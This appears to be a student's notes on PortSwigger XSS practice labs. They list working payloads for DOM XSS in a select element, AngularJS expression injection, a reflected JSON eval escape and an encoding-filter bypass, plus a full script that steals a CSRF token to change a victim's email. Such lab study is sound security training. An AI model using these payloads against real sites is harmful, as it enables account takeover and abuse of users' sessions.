# Cross-Site Scripting (XSS) Labs PortSwigger
### Practitioner
**Completed:** 5/16

---

## Advanced DOM XSS
### 1. DOM XSS inside select element

**Goal:** Escape a <select> context and inject JavaScript.

**Vulnerability:** document.write inserts untrusted input.

**Payload:** "></select><img src=1 onerror=alert(1)>

---

### 2. DOM XSS in AngularJS expression

**Goal:** Execute JavaScript through AngularJS template expressions.

**Vulnerability:** AngularJS expressions are evaluated inside the DOM.

**Payload:** {{$on.constructor('alert(1)')()}}

---

### 3. Reflected DOM XSS

**Goal:** Exploit unsafe eval() processing of reflected JSON.

**Vulnerability:** User input is reflected in JSON and executed by JavaScript.

**Payload:** \"-alert(1)}//

**Result:** Escapes the JSON structure and executes JavaScript.

### 4. Stored DOM XSS

**Goal:** Bypass incomplete HTML encoding.

**Vulnerability:** replace() only encodes the first occurrence of < and >.

**Payload:** <><img src=1 onerror=alert(1)>

**Result:** The second set of angle brackets bypasses the filter.

---

## XSS Exploitation
### 5. Exploiting XSS to bypass CSRF defenses

**Goal:** Steal a CSRF token and change a victim’s email address.

**Technique:**

- Load the victim’s account page
- Extract the CSRF token
- Send a forged request

**Payload:**

<script>
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST','/my-account/change-email',true);
    changeReq.send('csrf='+token+'&email=test@test.com');
};
req.open('GET','/my-account',true);
req.send();
</script>

**Result:** Victim’s email address is changed automatically.
